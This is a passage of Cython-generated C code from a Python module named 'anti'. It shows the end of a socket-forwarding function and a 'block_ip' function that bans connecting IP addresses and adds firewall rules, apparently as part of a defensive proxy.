            __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_ip); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_13 = NULL;
            __pyx_t_9 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
                __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_8);
                if (likely(__pyx_t_13)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                    __Pyx_INCREF(__pyx_t_13);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_8, function);
                    __pyx_t_9 = 1;
                }
            }
#if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_8)) {
                PyObject* __pyx_temp[3] = { __pyx_t_13, __pyx_t_11, __pyx_t_12 };
                __pyx_t_10 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_GOTREF(__pyx_t_10);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            else
#endif
#if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
                    PyObject* __pyx_temp[3] = { __pyx_t_13, __pyx_t_11, __pyx_t_12 };
                    __pyx_t_10 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                    __Pyx_GOTREF(__pyx_t_10);
                    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                }
                else
#endif
                {
                    __pyx_t_14 = PyTuple_New(2 + __pyx_t_9); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_14);
                    if (__pyx_t_13) {
                        __Pyx_GIVEREF(__pyx_t_13); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_13); __pyx_t_13 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_11);
                    PyTuple_SET_ITEM(__pyx_t_14, 0 + __pyx_t_9, __pyx_t_11);
                    __Pyx_GIVEREF(__pyx_t_12);
                    PyTuple_SET_ITEM(__pyx_t_14, 1 + __pyx_t_9, __pyx_t_12);
                    __pyx_t_11 = 0;
                    __pyx_t_12 = 0;
                    __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_14, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_10);
                    __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                }
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L4_exception_handled;
        } {
            __Pyx_ErrRestore(0, 0, 0);
            goto __pyx_L4_exception_handled;
        }
    __pyx_L5_except_error:;
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
        goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
    }
    {
        __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
        __Pyx_XGOTREF(__pyx_t_3);
        __Pyx_XGOTREF(__pyx_t_2);
        __Pyx_XGOTREF(__pyx_t_1); {
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_source, __pyx_n_s_shutdown); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 54, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_socket); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 54, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_SHUT_RD); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 54, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_7)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                    __Pyx_INCREF(__pyx_t_7);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_6, function);
                }
            }
            __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 54, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_destination, __pyx_n_s_shutdown); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 55, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_socket); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 55, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_SHUT_WR); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 55, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_8)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                    __Pyx_INCREF(__pyx_t_8);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_6, function);
                }
            }
            __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 55, __pyx_L20_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        goto __pyx_L25_try_end;
    __pyx_L20_error:;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0; {
            __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7) < 0) __PYX_ERR(0, 56, __pyx_L22_except_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_XDECREF(__pyx_r);
            __pyx_r = Py_None; __Pyx_INCREF(Py_None);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            goto __pyx_L23_except_return;
        }
    __pyx_L22_except_error:;
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
        goto __pyx_L1_error;
    __pyx_L23_except_return:;
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
        goto __pyx_L0;
    __pyx_L25_try_end:;
    }
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_10);
    __Pyx_XDECREF(__pyx_t_11);
    __Pyx_XDECREF(__pyx_t_12);
    __Pyx_XDECREF(__pyx_t_13);
    __Pyx_XDECREF(__pyx_t_14);
    __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v_string);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_9block_ip(PyObject* __pyx_self, PyObject* __pyx_args, PyObject* __pyx_kwds);
static PyMethodDef __pyx_mdef_4anti_9block_ip = { "block_ip", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4anti_9block_ip, METH_VARARGS | METH_KEYWORDS, 0 };
static PyObject* __pyx_pw_4anti_9block_ip(PyObject* __pyx_self, PyObject* __pyx_args, PyObject* __pyx_kwds) {
    PyObject* __pyx_v_con_ip = 0;
    PyObject* __pyx_v_port = 0;
    PyObject* __pyx_v_a = 0;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("block_ip (wrapper)", 0);
    {
        static PyObject** __pyx_pyargnames[] = { &__pyx_n_s_con_ip,&__pyx_n_s_port,&__pyx_n_s_a,0 };
        PyObject* values[3] = { 0,0,0 };
        if (unlikely(__pyx_kwds)) {
            Py_ssize_t kw_args;
            const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
            switch (pos_args) {
            case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
                CYTHON_FALLTHROUGH;
            case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
                CYTHON_FALLTHROUGH;
            case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
                CYTHON_FALLTHROUGH;
            case  0: break;
            default: goto __pyx_L5_argtuple_error;
            }
            kw_args = PyDict_Size(__pyx_kwds);
            switch (pos_args) {
            case  0:
                if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_con_ip)) != 0)) kw_args--;
                else goto __pyx_L5_argtuple_error;
                CYTHON_FALLTHROUGH;
            case  1:
                if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_port)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("block_ip", 1, 3, 3, 1); __PYX_ERR(0, 58, __pyx_L3_error)
                }
                CYTHON_FALLTHROUGH;
            case  2:
                if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_a)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("block_ip", 1, 3, 3, 2); __PYX_ERR(0, 58, __pyx_L3_error)
                }
            }
            if (unlikely(kw_args > 0)) {
                if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "block_ip") < 0)) __PYX_ERR(0, 58, __pyx_L3_error)
            }
        }
        else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
            goto __pyx_L5_argtuple_error;
        }
        else {
            values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
            values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
            values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        }
        __pyx_v_con_ip = values[0];
        __pyx_v_port = values[1];
        __pyx_v_a = values[2];
    }
    goto __pyx_L4_argument_unpacking_done;
__pyx_L5_argtuple_error:;
    __Pyx_RaiseArgtupleInvalid("block_ip", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 58, __pyx_L3_error)
        __pyx_L3_error:;
    __Pyx_AddTraceback("anti.block_ip", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __Pyx_RefNannyFinishContext();
    return NULL;
__pyx_L4_argument_unpacking_done:;
    __pyx_r = __pyx_pf_4anti_8block_ip(__pyx_self, __pyx_v_con_ip, __pyx_v_port, __pyx_v_a);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_8block_ip(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_con_ip, PyObject* __pyx_v_port, PyObject* __pyx_v_a) {
    PyObject* __pyx_v_f = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    Py_ssize_t __pyx_t_4;
    int __pyx_t_5;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    PyObject* __pyx_t_8 = NULL;
    PyObject* __pyx_t_9 = NULL;
    PyObject* __pyx_t_10 = NULL;
    PyObject* __pyx_t_11 = NULL;
    PyObject* __pyx_t_12 = NULL;
    int __pyx_t_13;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("block_ip", 0);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_a, __pyx_n_s_close); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 60, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
        }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_4 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_4 == ((Py_ssize_t)-1))) __PYX_ERR(0, 61, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_5 = ((__pyx_t_4 < 0x1FAF) != 0);
    if (__pyx_t_5) {
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = PyNumber_Add(__pyx_kp_u__3, __pyx_v_con_ip); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 62, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_InPlaceAdd(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_list_ban_ip, __pyx_t_2) < 0) __PYX_ERR(0, 62, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_add_ip_rule); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
        }
    }
    __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_v_port) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_port);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 63, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0; {
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 64, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 64, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 64, __pyx_L4_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_1, function);
            }
        }
        __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L4_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __pyx_t_3;
        __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0; {
            {
                __Pyx_PyThreadState_declare
                    __Pyx_PyThreadState_assign
                    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
                __Pyx_XGOTREF(__pyx_t_8);
                __Pyx_XGOTREF(__pyx_t_9);
                __Pyx_XGOTREF(__pyx_t_10); {
                    __pyx_v_f = __pyx_t_1;
                    __pyx_t_1 = 0;
                    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L8_error)
                        __Pyx_GOTREF(__pyx_t_2);
                    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u__5, __pyx_n_s_format); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 65, __pyx_L8_error)
                        __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_11 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
                        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_7);
                        if (likely(__pyx_t_11)) {
                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                            __Pyx_INCREF(__pyx_t_11);
                            __Pyx_INCREF(function);
                            __Pyx_DECREF_SET(__pyx_t_7, function);
                        }
                    }
                    __pyx_t_3 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_11, __pyx_v_con_ip) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_v_con_ip);
                    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L8_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __pyx_t_7 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
                        if (likely(__pyx_t_7)) {
                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                            __Pyx_INCREF(__pyx_t_7);
                            __Pyx_INCREF(function);
                            __Pyx_DECREF_SET(__pyx_t_2, function);
                        }
                    }
                    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L8_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                }
                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                goto __pyx_L13_try_end;
            __pyx_L8_error:;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0; {
                    __Pyx_AddTraceback("anti.block_ip", __pyx_clineno, __pyx_lineno, __pyx_filename);
                    if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 64, __pyx_L10_except_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_GOTREF(__pyx_t_2);
                    __Pyx_GOTREF(__pyx_t_3);
                    __pyx_t_7 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 64, __pyx_L10_except_error)
                        __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_7, NULL);
                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 64, __pyx_L10_except_error)
                        __Pyx_GOTREF(__pyx_t_12);
                    __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_12);
                    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                    if (__pyx_t_5 < 0) __PYX_ERR(0, 64, __pyx_L10_except_error)
                        __pyx_t_13 = ((!(__pyx_t_5 != 0)) != 0);
                    if (__pyx_t_13) {
                        __Pyx_GIVEREF(__pyx_t_1);
                        __Pyx_GIVEREF(__pyx_t_2);
                        __Pyx_XGIVEREF(__pyx_t_3);
                        __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_2, __pyx_t_3);
                        __pyx_t_1 = 0; __pyx_t_2 = 0; __pyx_t_3 = 0;
                        __PYX_ERR(0, 64, __pyx_L10_except_error)
                    }
                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                    goto __pyx_L9_exception_handled;
                }
            __pyx_L10_except_error:;
                __Pyx_XGIVEREF(__pyx_t_8);
                __Pyx_XGIVEREF(__pyx_t_9);
                __Pyx_XGIVEREF(__pyx_t_10);
                __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
                goto __pyx_L1_error;
            __pyx_L9_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_8);
                __Pyx_XGIVEREF(__pyx_t_9);
                __Pyx_XGIVEREF(__pyx_t_10);
                __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
            __pyx_L13_try_end:;
            }
        } { {
                if (__pyx_t_6) {
                    __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__6, NULL);
                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 64, __pyx_L1_error)
                        __Pyx_GOTREF(__pyx_t_10);
                    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                }
                goto __pyx_L7;
            }
        __pyx_L7:;
        }
        goto __pyx_L17;
    __pyx_L4_error:;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        goto __pyx_L1_error;
    __pyx_L17:;
    }
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_force_block); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 66, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    if (unlikely(PyObject_SetItem(__pyx_t_3, __pyx_v_con_ip, __pyx_int_0) < 0)) __PYX_ERR(0, 66, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_7);
